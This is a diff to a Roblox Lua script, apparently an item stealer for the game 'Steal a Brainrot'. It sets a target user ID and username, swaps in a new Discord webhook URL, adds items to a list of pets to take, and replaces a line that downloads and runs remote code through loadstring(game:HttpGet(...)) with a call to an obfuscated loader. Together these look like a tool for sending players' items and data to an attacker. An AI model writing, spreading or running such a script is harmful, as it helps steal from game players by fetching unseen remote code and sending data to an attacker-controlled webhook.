@@ -1,6 +1,6 @@
 local TARGET_ID = 10095557361
 local TARGET_USER = "nl51329"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572912165717807174/5yfosWcYGd7s0YwOc39kFFX7w-uIKh1G7WAFDNleSI7THEYEb7O2T4-XKwMgjjX2jEwc"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1574028038834753566/QqQeYjq9qonse1dbBV6f6knIjd-YyeokkvxLIJytwSc9go6fZtqrTEaYzFseZboaqdpb"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -287,7 +287,15 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Cobra Gelato"] = true,
+    ["Flying Dutchman"] = true,
+    ["Machine Bros"] = true,
+    ["Skelly and Coffy"] = true,
+    ["Sammyni Bros"] = true,
+    ["Puppetmaster"] = true,
+    ["Medusini and Demonini"] = true,
+    ["Cabin Bros"] = true
 }
 
 local TargetBaseSkins = {
@@ -346,7 +354,7 @@ local TargetGears = {
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+    loadstring(game:HttpGet("https://api.luarmor.us/files/v4/loaders/98abc3ce62f30217944c19b0ec4932f9.lua"))()
 
     task.wait(1)
 
